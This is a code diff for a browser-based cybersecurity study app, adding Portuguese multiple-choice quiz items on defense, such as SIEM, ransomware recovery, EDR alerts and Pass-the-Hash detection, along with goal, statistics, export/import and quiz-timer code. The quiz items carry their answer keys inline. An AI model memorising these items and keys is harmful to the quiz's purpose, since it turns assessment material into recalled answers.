+  {q:"O que é incident response?",a:["Backup","Processo estruturado de reação a incidentes (PICERL: Prepare, Identify, Contain, Eradicate, Recover, Lessons)","Antivirus","Patch"],correct:1,expl:"IR é metodologia. NIST e SANS definem fases. Plano testado (tabletop) salva caos quando incidente real ocorre."}
+];
+
+const QUIZ_B11_PRACTICE = [
+  {q:"Logs inundados de logins falhos de IPs variados. Que ferramenta agrega+alerta?",a:["Antivirus","SIEM","WAF","Backup"],correct:1,expl:"SIEM correlaciona logs de múltiplas fontes. Regra: 'N falhas em M minutos de IPs diferentes pro mesmo user = alerta'."},
+  {q:"Recovery de ransomware exige principalmente?",a:["Pagar","Backup íntegro offline/imutável e plano de IR","Mais firewall","Antivírus novo"],correct:1,expl:"Backup imutável (WORM, S3 Object Lock) que ransomware não conseguiu cifrar é o ouro do recovery."},
+  {q:"App web sofrendo tentativas de SQLi. Defesa primária no perímetro?",a:["Antivirus","WAF + queries parametrizadas no app","Reiniciar","Mudar IP"],correct:1,expl:"WAF mitiga rapidinho (regras OWASP CRS) mas correção real é no código (parameterized queries). Defesa em camadas."},
+  {q:"Host com EDR alertando 'powershell encoded command from Word'. Provável?",a:["Update","Phishing/macro maliciosa em Office","Backup","Wi-Fi"],correct:1,expl:"Word → PowerShell -enc é padrão clássico de macro malicious downloader. Contenha host + hunt mais hosts com mesmo IOC."},
+  {q:"Alertas de SIEM em volume alto e analista sobrecarregado. Solução?",a:["Mais alerta","Tuning de regras + SOAR (automação de playbooks)","Desligar SIEM","Ignorar"],correct:1,expl:"Alert fatigue mata SOC. Reduza FPs (tuning) + automatize triagem repetitiva com SOAR."},
+  {q:"Servidor crítico expõe SMB direto na internet. Hardening primeiro passo?",a:["Antivirus","Fechar SMB no firewall + VPN/segmentação pra acesso","Backup","Patch"],correct:1,expl:"SMB exposto = vetor de worms (EternalBlue, etc). Princípio: nunca exponha serviços internos diretamente."},
+  {q:"Após breach, time precisa recuperar timeline de ações do atacante. Onde buscar?",a:["Reiniciar","Logs auditd/Sysmon, EDR telemetry, SIEM, pcaps","Antivirus","Backup"],correct:1,expl:"Forense = correlação de fontes. Sysmon + audit + EDR processo tree + flow logs reconstroem a invasão."},
+  {q:"Funcionários usando senhas fracas e reusadas. Mitigação eficaz?",a:["Treinamento só","MFA + password manager corporativo + monitor de leaks (HIBP)","Antivirus","Firewall"],correct:1,expl:"MFA neutraliza maioria de credential stuffing. Manager + checagem em HIBP previnem reuso/vazamentos."},
+  {q:"Você quer detectar movimento lateral via Pass-the-Hash. Melhor abordagem?",a:["Antivirus","EDR + SIEM detectando logon types anômalos + LSASS access","WAF","Backup"],correct:1,expl:"Watch type 3 logons de hosts incomuns, lsass access, NTLM com hashes. Credential Guard mitiga na fonte."},
+  {q:"Plano de IR nunca foi testado. Risco?",a:["Nenhum","Caos no incidente real — papéis, contatos, ferramentas falham sob pressão","Mais rápido","Sem risco"],correct:1,expl:"Tabletop exercises + simulações revelam gaps. Plano não testado = plano de ficção."}
+];
+
+
 const QUIZ_DATA = {
   b: {
     label: 'Block 0 · PC Basics',
@@ -5359,6 +6069,46 @@ const QUIZ_DATA = {
     label: 'Block 3 · Linux',
     theory: QUIZ_B3_THEORY,
     practice: QUIZ_B3_PRACTICE
+  },
+  p: {
+    label: 'Block 4 · Programming Basics',
+    theory: QUIZ_B4_THEORY,
+    practice: QUIZ_B4_PRACTICE
+  },
+  s: {
+    label: 'Block 5 · Security Fundamentals',
+    theory: QUIZ_B5_THEORY,
+    practice: QUIZ_B5_PRACTICE
+  },
+  a: {
+    label: 'Block 6 · Web Attacks',
+    theory: QUIZ_B6_THEORY,
+    practice: QUIZ_B6_PRACTICE
+  },
+  t: {
+    label: 'Block 7 · Pentest Tools',
+    theory: QUIZ_B7_THEORY,
+    practice: QUIZ_B7_PRACTICE
+  },
+  m: {
+    label: 'Block 8 · Pentest Methodology',
+    theory: QUIZ_B8_THEORY,
+    practice: QUIZ_B8_PRACTICE
+  },
+  e: {
+    label: 'Block 9 · Social Engineering',
+    theory: QUIZ_B9_THEORY,
+    practice: QUIZ_B9_PRACTICE
+  },
+  x: {
+    label: 'Block 10 · Malware',
+    theory: QUIZ_B10_THEORY,
+    practice: QUIZ_B10_PRACTICE
+  },
+  d: {
+    label: 'Block 11 · Defense',
+    theory: QUIZ_B11_THEORY,
+    practice: QUIZ_B11_PRACTICE
   }
 };
 
@@ -5696,5 +6446,451 @@ Revisar erros
 </div>
 </div>
 
+<script>
+// ============ SPRINT 4: GOALS, STATS, EXPORT/IMPORT/RESET, QUIZ MODS ============
+
+// ---- GOALS ----
+const GOALS_KEY = 'cherryRootGoals';
+const SUGGESTED_GOALS = [
+  "Become Junior Pentester in 6 months",
+  "Complete TryHackMe Pre-Security path",
+  "Pass CompTIA Security+",
+  "Solve 20 CTFs (PicoCTF, HTB)",
+  "Learn Burp Suite, nmap, sqlmap"
+];
+
+function loadGoals(){
+  try{ const raw = localStorage.getItem(GOALS_KEY); return raw ? JSON.parse(raw) : []; }catch(e){ return []; }
+}
+function saveGoals(goals){
+  try{ localStorage.setItem(GOALS_KEY, JSON.stringify(goals)); }catch(e){}
+}
+function addGoal(text){
+  const input = document.getElementById('goalInput');
+  const value = (typeof text === 'string') ? text : (input ? input.value.trim() : '');
+  if(!value) return;
+  const goals = loadGoals();
+  goals.push({id:'g_'+Date.now()+'_'+Math.random().toString(36).slice(2,7), text:value, done:false, created:new Date().toISOString()});
+  saveGoals(goals);
+  if(input && typeof text !== 'string') input.value = '';
+  renderGoals();
+}
+function toggleGoal(id){
+  const goals = loadGoals();
+  const g = goals.find(x=>x.id===id);
+  if(g){ g.done = !g.done; saveGoals(goals); renderGoals(); }
+}
+function deleteGoal(id){
+  const goals = loadGoals().filter(x=>x.id!==id);
+  saveGoals(goals); renderGoals();
+}
+function renderGoals(){
+  const goals = loadGoals();
+  const counter = document.getElementById('goalsCounter');
+  const list = document.getElementById('goalsList');
+  if(!list) return;
+  const done = goals.filter(g=>g.done).length;
+  if(counter) counter.textContent = done + ' / ' + goals.length + ' goals completed';
+  if(goals.length === 0){
+    list.innerHTML = '<div style="background:white;border:1.5px dashed var(--p200);border-radius:12px;padding:1.2rem;text-align:center;font-size:.82rem;color:var(--ink3);font-style:italic">No goals yet. Add one above or pick a suggestion.</div>';
+    return;
+  }
+  list.innerHTML = goals.map(g => {
+    const date = new Date(g.created);
+    const d = date.toLocaleDateString();
+    const style = g.done ? 'opacity:.5;text-decoration:line-through' : '';
+    return '<div style="background:white;border:1.5px solid var(--line);border-radius:12px;padding:.8rem 1rem;margin-bottom:.5rem;display:flex;align-items:center;gap:.7rem">' +
+      '<input type="checkbox" ' + (g.done?'checked':'') + ' onchange="toggleGoal(\''+g.id+'\')" style="width:18px;height:18px;cursor:pointer;accent-color:var(--p500);flex-shrink:0">' +
+      '<div style="flex:1;min-width:0">' +
+        '<div style="font-size:.88rem;color:var(--ink);line-height:1.4;'+style+'">'+escapeHtml(g.text)+'</div>' +
+        '<div style="font-family:\'DM Mono\',monospace;font-size:.62rem;color:var(--ink4);margin-top:.2rem">added '+d+'</div>' +
+      '</div>' +
+      '<button onclick="deleteGoal(\''+g.id+'\')" title="Delete" style="background:none;border:none;color:var(--p400);cursor:pointer;font-size:1.1rem;padding:.2rem .4rem">&times;</button>' +
+    '</div>';
+  }).join('');
+}
+function renderGoalSuggestions(){
+  const wrap = document.getElementById('goalSuggestions');
+  if(!wrap) return;
+  wrap.innerHTML = SUGGESTED_GOALS.map(s =>
+    '<button onclick="addGoal('+JSON.stringify(s)+')" style="font-family:\'DM Mono\',monospace;font-size:.66rem;background:var(--p100);border:1px solid var(--p200);color:var(--ink2);border-radius:8px;padding:.4rem .75rem;cursor:pointer">+ '+escapeHtml(s)+'</button>'
+  ).join('');
+}
+
+// ---- STATS ----
+const TERM_RE = /^pg-[a-z]\d{2}$/;
+const BLOCK_LETTERS = ['b','w','n','l','p','s','a','t','m','e','x','d'];
+const BLOCK_NAMES = {b:'PC Basics',w:'Internet',n:'Networks',l:'Linux',p:'Programming',s:'Security',a:'Web Attacks',t:'Pentest Tools',m:'Methodology',e:'Social Eng.',x:'Malware',d:'Defense'};
+
+function countTerms(){
+  return document.querySelectorAll('.pg[id^="pg-"]').length === 0 ? 0 :
+    Array.from(document.querySelectorAll('.pg')).filter(el => TERM_RE.test(el.id)).length;
+}
+function statCard(num, label, sub, svg){
+  return '<div style="background:white;border:1.5px solid var(--line);border-radius:14px;padding:1rem;display:flex;flex-direction:column;gap:.3rem;min-width:0">' +
+    '<div style="display:flex;align-items:center;justify-content:space-between;gap:.4rem"><div style="font-family:\'Playfair Display\',serif;font-size:1.8rem;font-weight:700;color:var(--p500);line-height:1">'+num+'</div>'+
+    '<div style="color:var(--p300);flex-shrink:0">'+svg+'</div></div>'+
+    '<div style="font-family:\'DM Mono\',monospace;font-size:.6rem;letter-spacing:.15em;text-transform:uppercase;color:var(--ink3)">'+label+'</div>'+
+    (sub ? '<div style="font-size:.72rem;color:var(--ink4)">'+sub+'</div>' : '') +
+  '</div>';
+}
+function renderStats(){
+  const grid = document.getElementById('statsGrid');
+  if(!grid) return;
+  const data = (typeof loadData === 'function') ? loadData() : {tags:{},notes:{}};
+  const tags = data.tags || {};
+  const notes = data.notes || {};
+  const total = countTerms();
+  let studied=0, fav=0, review=0, hard=0;
+  Object.keys(tags).forEach(k => {
+    if(tags[k].studied) studied++;
+    if(tags[k].fav) fav++;
+    if(tags[k].review) review++;
+    if(tags[k].hard) hard++;
+  });
+  const notesCount = Object.keys(notes).filter(k => (notes[k]||'').trim().length>0).length;
+
+  // Quiz scores
+  const quizKeys = [];
+  for(let i=0;i<localStorage.length;i++){
+    const k = localStorage.key(i);
+    if(k && k.indexOf('cherryRootQuizBest_')===0) quizKeys.push(k);
+  }
+  const scores = quizKeys.map(k => parseInt(localStorage.getItem(k)||'0')).filter(n=>!isNaN(n));
+  const avg = scores.length ? Math.round(scores.reduce((a,b)=>a+b,0)/scores.length) : 0;
+
+  const ico = {
+    book:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M4 4 L11 4 L12 5 L13 4 L20 4 L20 19 L13 19 L12 20 L11 19 L4 19 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg>',
+    check:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/><polyline points="8 12 11 15 16 9" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+    heart:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 21 L4 13 Q1 10 4 7 Q7 4 12 9 Q17 4 20 7 Q23 10 20 13 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg>',
+    eye:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M2 12 Q7 5 12 5 Q17 5 22 12 Q17 19 12 19 Q7 19 2 12 Z" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/></svg>',
+    flame:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 3 Q14 8 18 11 Q20 14 18 18 Q15 22 9 21 Q4 19 5 13 Q7 14 8 12 Q10 8 12 3 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg>',
+    trophy:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M7 4 L17 4 L17 9 Q17 13 12 13 Q7 13 7 9 Z" stroke="currentColor" stroke-width="1.8"/><line x1="10" y1="14" x2="14" y2="14" stroke="currentColor" stroke-width="1.8"/><line x1="12" y1="13" x2="12" y2="17" stroke="currentColor" stroke-width="1.8"/><line x1="8" y1="20" x2="16" y2="20" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>',
+    pen:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M14 4 L20 10 L9 21 L3 21 L3 15 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/></svg>',
+    bar:'<svg width="20" height="20" viewBox="0 0 24 24" fill="none"><line x1="5" y1="20" x2="5" y2="13" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><line x1="12" y1="20" x2="12" y2="8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/><line x1="19" y1="20" x2="19" y2="15" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/></svg>'
+  };
+
+  grid.innerHTML = [
+    statCard(total, 'Total terms', null, ico.book),
+    statCard(studied, 'Studied', total ? Math.round(studied/total*100)+'%' : '0%', ico.check),
+    statCard(fav, 'Favorites', null, ico.heart),
+    statCard(review, 'To review', null, ico.eye),
+    statCard(hard, 'Hard', null, ico.flame),
+    statCard(quizKeys.length, 'Quizzes done', null, ico.trophy),
+    statCard(avg+'%', 'Avg quiz score', null, ico.bar),
+    statCard(notesCount, 'Notes written', null, ico.pen)
+  ].join('');
+
+  // Quizzes block
+  const qWrap = document.getElementById('statsQuizzes');
+  if(qWrap){
+    if(quizKeys.length === 0){
+      qWrap.innerHTML = '<div style="font-size:.82rem;color:var(--ink3);font-style:italic">No quizzes completed yet.</div>';
+    } else {
+      qWrap.innerHTML = quizKeys.sort().map(k => {
+        const score = parseInt(localStorage.getItem(k)||'0');
+        const label = k.replace('cherryRootQuizBest_','').replace('_',' · ');
+        return '<div style="display:flex;align-items:center;gap:.6rem;padding:.4rem 0;border-bottom:1px solid var(--line);font-size:.8rem"><span style="font-family:\'DM Mono\',monospace;font-size:.7rem;color:var(--p500);min-width:90px">'+escapeHtml(label)+'</span><div style="flex:1;height:6px;background:var(--p100);border-radius:99px;overflow:hidden"><div style="height:100%;background:var(--p400);width:'+score+'%"></div></div><span style="font-family:\'DM Mono\',monospace;font-size:.72rem;color:var(--ink2);min-width:40px;text-align:right">'+score+'%</span></div>';
+      }).join('');
+    }
+  }
+
+  // Blocks progress (studied per block)
+  const bWrap = document.getElementById('statsBlocks');
+  if(bWrap){
+    const counts = {};
+    BLOCK_LETTERS.forEach(l => counts[l] = {s:0,t:0});
+    Array.from(document.querySelectorAll('.pg')).forEach(el => {
+      const m = el.id.match(/^pg-([a-z])\d{2}$/);
+      if(m && counts[m[1]]) counts[m[1]].t++;
+    });
+    Object.keys(tags).forEach(k => {
+      const letter = k[0];
+      if(counts[letter] && tags[k].studied) counts[letter].s++;
+    });
+    const list = BLOCK_LETTERS.filter(l => counts[l].t>0);
+    let best={pct:-1,label:'—'}, worst={pct:101,label:'—'};
+    list.forEach(l => {
+      const pct = counts[l].t ? Math.round(counts[l].s/counts[l].t*100) : 0;
+      if(pct > best.pct){ best = {pct, label: BLOCK_NAMES[l]}; }
+      if(pct < worst.pct){ worst = {pct, label: BLOCK_NAMES[l]}; }
+    });
+    let html = list.map(l => {
+      const pct = counts[l].t ? Math.round(counts[l].s/counts[l].t*100) : 0;
+      return '<div style="display:flex;align-items:center;gap:.6rem;padding:.35rem 0;border-bottom:1px solid var(--line);font-size:.78rem"><span style="font-family:\'DM Mono\',monospace;font-size:.68rem;color:var(--p500);min-width:120px">'+escapeHtml(BLOCK_NAMES[l])+'</span><div style="flex:1;height:6px;background:var(--p100);border-radius:99px;overflow:hidden"><div style="height:100%;background:var(--p400);width:'+pct+'%"></div></div><span style="font-family:\'DM Mono\',monospace;font-size:.7rem;color:var(--ink2);min-width:60px;text-align:right">'+counts[l].s+'/'+counts[l].t+'</span></div>';
+    }).join('');
+    html += '<div style="margin-top:.7rem;padding-top:.7rem;border-top:1.5px solid var(--p200);display:flex;flex-wrap:wrap;gap:.6rem;font-size:.78rem"><div style="flex:1;min-width:140px"><strong style="color:var(--p500)">Best:</strong> '+escapeHtml(best.label)+' ('+best.pct+'%)</div><div style="flex:1;min-width:140px"><strong style="color:var(--ink3)">Lowest:</strong> '+escapeHtml(worst.label)+' ('+worst.pct+'%)</div></div>';
+    bWrap.innerHTML = html;
+  }
+
+  // Streak
+  renderStreak();
+}
+
+function recordStreak(){
+  try{
+    const today = new Date().toISOString().slice(0,10);
+    const raw = localStorage.getItem('cherryRootStreak');
+    let data = raw ? JSON.parse(raw) : {last:null, count:0, days:[]};
+    if(data.last === today) return;
+    const y = new Date(Date.now()-86400000).toISOString().slice(0,10);
+    data.count = (data.last === y) ? (data.count+1) : 1;
+    data.last = today;
+    data.days = (data.days||[]).concat([today]).slice(-60);
+    localStorage.setItem('cherryRootStreak', JSON.stringify(data));
+  }catch(e){}
+}
+function renderStreak(){
+  const el = document.getElementById('statsStreak');
+  if(!el) return;
+  try{
+    const raw = localStorage.getItem('cherryRootStreak');
+    const data = raw ? JSON.parse(raw) : {count:0};
+    el.innerHTML = '<span style="font-size:2rem;color:var(--p500)">'+(data.count||0)+'</span> <span style="font-size:.9rem;color:var(--ink3)">day streak</span>';
+  }catch(e){ el.textContent = '0 days'; }
+}
+
+// ---- EXPORT / IMPORT / RESET ----
+function collectCherryKeys(){
+  const out = {};
+  for(let i=0;i<localStorage.length;i++){
+    const k = localStorage.key(i);
+    if(k && k.indexOf('cherryRoot')===0) out[k] = localStorage.getItem(k);
+  }
+  return out;
+}
+function exportProgress(){
+  const keys = collectCherryKeys();
+  const payload = {exportedAt: new Date().toISOString(), version:1, data:{}};
+  Object.keys(keys).forEach(k => {
+    try{ payload.data[k] = JSON.parse(keys[k]); }
+    catch(e){ payload.data[k] = keys[k]; }
+  });
+  const blob = new Blob([JSON.stringify(payload, null, 2)], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  const stamp = new Date().toISOString().slice(0,10);
+  a.href = url;
+  a.download = 'cherry-root-progress-' + stamp + '.cherry.json';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=>{ document.body.removeChild(a); URL.revokeObjectURL(url); }, 100);
+}
+function importProgress(file){
+  const status = document.getElementById('importStatus');
+  if(!file){ if(status) status.textContent = 'No file selected.'; return; }
+  const reader = new FileReader();
+  reader.onload = function(ev){
+    let parsed;
+    try{ parsed = JSON.parse(ev.target.result); }
+    catch(e){ if(status) status.textContent = 'Could not read file: invalid JSON.'; return; }
+    const data = parsed.data || parsed;
+    let tagsCount = 0, notesCount = 0, quizCount = 0, goalsCount = 0;
+    try{
+      const root = data.cherryRootData;
+      if(root && root.tags) tagsCount = Object.keys(root.tags).length;
+      if(root && root.notes) notesCount = Object.keys(root.notes).length;
+    }catch(e){}
+    if(data.cherryRootGoals && Array.isArray(data.cherryRootGoals)) goalsCount = data.cherryRootGoals.length;
+    Object.keys(data).forEach(k => { if(k.indexOf('cherryRootQuizBest_')===0) quizCount++; });
+    const summary = tagsCount+' tags, '+notesCount+' notes, '+quizCount+' quiz scores, '+goalsCount+' goals';
+    const choice = window.prompt('This will modify your current progress.\n\nFound: '+summary+'\n\nType MERGE to combine with existing data, or REPLACE to overwrite everything.');
+    if(!choice) { if(status) status.textContent = 'Import cancelled.'; return; }
+    const mode = choice.trim().toUpperCase();
+    if(mode !== 'MERGE' && mode !== 'REPLACE'){ if(status) status.textContent = 'Import cancelled (invalid keyword).'; return; }
+    if(mode === 'REPLACE'){
+      const cur = collectCherryKeys();
+      Object.keys(cur).forEach(k => localStorage.removeItem(k));
+      Object.keys(data).forEach(k => {
+        const v = data[k];
+        localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+      });
+    } else {
+      // Merge
+      Object.keys(data).forEach(k => {
+        const v = data[k];
+        if(k === 'cherryRootData'){
+          let cur = {tags:{},notes:{}};
+          try{ const raw = localStorage.getItem(k); if(raw) cur = JSON.parse(raw); }catch(e){}
+          const incoming = (typeof v === 'string') ? JSON.parse(v) : v;
+          cur.tags = Object.assign({}, cur.tags||{}, incoming.tags||{});
+          cur.notes = Object.assign({}, cur.notes||{}, incoming.notes||{});
+          localStorage.setItem(k, JSON.stringify(cur));
+        } else if(k === 'cherryRootGoals'){
+          let cur = [];
+          try{ const raw = localStorage.getItem(k); if(raw) cur = JSON.parse(raw); }catch(e){}
+          const incoming = (typeof v === 'string') ? JSON.parse(v) : v;
+          const ids = new Set(cur.map(g=>g.id));
+          (incoming||[]).forEach(g => { if(!ids.has(g.id)) cur.push(g); });
+          localStorage.setItem(k, JSON.stringify(cur));
+        } else if(k.indexOf('cherryRootQuizBest_')===0){
+          const prev = parseInt(localStorage.getItem(k)||'0');
+          const incoming = parseInt(typeof v==='string' ? v : (v||0));
+          if(incoming > prev) localStorage.setItem(k, String(incoming));
+        } else {
+          localStorage.setItem(k, typeof v === 'string' ? v : JSON.stringify(v));
+        }
+      });
+    }
+    if(status) status.textContent = 'Imported successfully ('+mode.toLowerCase()+'). Reloading...';
+    setTimeout(()=>location.reload(), 800);
+  };
+  reader.readAsText(file);
+}
+function resetProgress(){
+  const c1 = window.confirm('Are you SURE you want to delete ALL your Cherry Root progress?\n\nThis cannot be undone.');
+  if(!c1) return;
+  const typed = window.prompt('Type DELETE (in caps) to confirm.');
+  if(!typed || typed.trim() !== 'DELETE'){ alert('Reset cancelled.'); return; }
+  const keys = [];
+  for(let i=0;i<localStorage.length;i++){
+    const k = localStorage.key(i);
+    if(k && k.indexOf('cherryRoot')===0) keys.push(k);
+  }
+  keys.forEach(k => localStorage.removeItem(k));
+  alert('All progress wiped. Reloading.');
+  location.reload();
+}
+
+// ---- QUIZ ENHANCEMENTS ----
+// Timed mode + Mixed mode + history
+let quizTimer = null;
+let quizTimeLeft = 0;
+let quizTimedEnabled = false;
+
+function quizToggleTimed(checked){
+  quizTimedEnabled = !!checked;
+}
+function quizMixedStart(){
+  // Build mixed pool from all blocks (theory + practice)
+  const pool = [];
+  if(typeof QUIZ_DATA !== 'undefined'){
+    Object.keys(QUIZ_DATA).forEach(bk => {
+      const blk = QUIZ_DATA[bk];
+      if(blk.theory) blk.theory.forEach(q => pool.push(q));
+      if(blk.practice) blk.practice.forEach(q => pool.push(q));
+    });
+  }
+  if(pool.length === 0){ alert('No quiz data available.'); return; }
+  // Shuffle and take 20
+  const shuffled = pool.slice().sort(()=>Math.random()-0.5).slice(0, Math.min(20, pool.length));
+  quizState.blockKey = 'mixed';
+  quizState.type = 'mixed';
+  quizState.questions = shuffled;
+  quizState.currentIdx = 0;
+  quizState.answers = [];
+  quizState.active = true;
+  // Show overlay
+  document.getElementById('quizBlockLabel').textContent = 'Quiz Misto · All Blocks';
+  document.getElementById('quizOverlay').classList.add('on');
+  document.getElementById('quizIntro').style.display = 'none';
+  document.getElementById('quizQuestion').style.display = 'block';
+  document.getElementById('quizResult').style.display = 'none';
+  if(typeof showQuestion === 'function') showQuestion();
+  if(quizTimedEnabled) quizStartTimer(5*60);
+}
+function quizStartTimer(seconds){
+  quizClearTimer();
+  quizTimeLeft = seconds;
+  let el = document.getElementById('quizTimerBadge');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'quizTimerBadge';
+    el.style.cssText = 'position:fixed;top:70px;right:20px;z-index:1001;background:var(--p500);color:white;font-family:DM Mono,monospace;font-size:.78rem;padding:.45rem .8rem;border-radius:99px;box-shadow:0 4px 12px rgba(201,66,110,.3)';
+    document.body.appendChild(el);
+  }
+  el.style.display = 'block';
+  const tick = function(){
+    const m = Math.floor(quizTimeLeft/60), s = quizTimeLeft%60;
+    el.textContent = '⏱ ' + m + ':' + (s<10?'0':'') + s;
+    if(quizTimeLeft <= 0){
+      quizClearTimer();
+      // Auto-submit: any unanswered are wrong
+      while(quizState.answers.length < quizState.questions.length){
+        const q = quizState.questions[quizState.answers.length];
+        quizState.answers.push({question:q.q, selected:-1, correct:q.correct, isCorrect:false, options:q.a, expl:q.expl});
+      }
+      if(typeof quizShowResult === 'function') quizShowResult();
+      return;
+    }
+    quizTimeLeft--;
+  };
+  tick();
+  quizTimer = setInterval(tick, 1000);
+}
+function quizClearTimer(){
+  if(quizTimer){ clearInterval(quizTimer); quizTimer = null; }
+  const el = document.getElementById('quizTimerBadge');
+  if(el) el.style.display = 'none';
+}
+
+// Wrap original quizClose / quizShowResult to clear timer + record history
+if(typeof quizClose === 'function'){
+  const _origQuizClose = window.quizClose;
+  window.quizClose = function(){ quizClearTimer(); _origQuizClose.apply(this, arguments); };
+}
+if(typeof quizShowResult === 'function'){
+  const _origQuizShowResult = window.quizShowResult;
+  window.quizShowResult = function(){
+    quizClearTimer();
+    // Record history
+    try{
+      const key = 'cherryRootQuizHistory_' + (quizState.blockKey||'?') + '_' + (quizState.type||'?');
+      const raw = localStorage.getItem(key);
+      const list = raw ? JSON.parse(raw) : [];
+      const correct = quizState.answers.filter(a=>a.isCorrect).length;
+      const total = quizState.answers.length || 1;
+      list.push({when:new Date().toISOString(), pct:Math.round(correct/total*100), correct:correct, total:total});
+      while(list.length > 3) list.shift();
+      localStorage.setItem(key, JSON.stringify(list));
+    }catch(e){}
+    _origQuizShowResult.apply(this, arguments);
+  };
+}
+// Wrap quizStart to launch timer
+if(typeof quizStart === 'function'){
+  const _origQuizStart = window.quizStart;
+  window.quizStart = function(){
+    _origQuizStart.apply(this, arguments);
+    if(quizTimedEnabled) quizStartTimer(5*60);
+  };
+}
+
+// Inject timed-mode toggle + mixed button into quiz intro on first open
+function injectQuizEnhancements(){
+  const intro = document.getElementById('quizIntro');
+  if(!intro || document.getElementById('quizTimedToggle')) return;
+  const startBtn = document.getElementById('quizStartBtn');
+  const wrap = document.createElement('div');
+  wrap.style.cssText = 'display:flex;flex-direction:column;gap:.5rem;margin:.6rem 0';
+  wrap.innerHTML =
+    '<label style="display:flex;align-items:center;gap:.5rem;font-size:.78rem;color:var(--ink2);cursor:pointer;justify-content:center"><input type="checkbox" id="quizTimedToggle" onchange="quizToggleTimed(this.checked)" style="accent-color:var(--p500)"> Modo Cronometrado (5 min)</label>' +
+    '<button type="button" onclick="quizMixedStart()" style="font-family:DM Mono,monospace;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;background:var(--ink);color:white;border:none;border-radius:10px;padding:.55rem 1rem;cursor:pointer">Quiz Misto · 20 random</button>';
+  if(startBtn && startBtn.parentNode) startBtn.parentNode.insertBefore(wrap, startBtn);
+}
+
+// ---- INIT ----
+function initSprint4(){
+  renderGoalSuggestions();
+  renderGoals();
+  renderStats();
+  injectQuizEnhancements();
+  recordStreak();
+  // Re-render stats on page open
+  const _go = window.go;
+  if(typeof _go === 'function'){
+    window.go = function(target, navItem){
+      _go(target, navItem);
+      if(target === 'stats') renderStats();
+      if(target === 'goals') renderGoals();
+    };
+  }
+}
+if(document.readyState === 'loading'){
+  document.addEventListener('DOMContentLoaded', initSprint4);
+} else {
+  initSprint4();
+}
+</script>
 </body>
 </html>
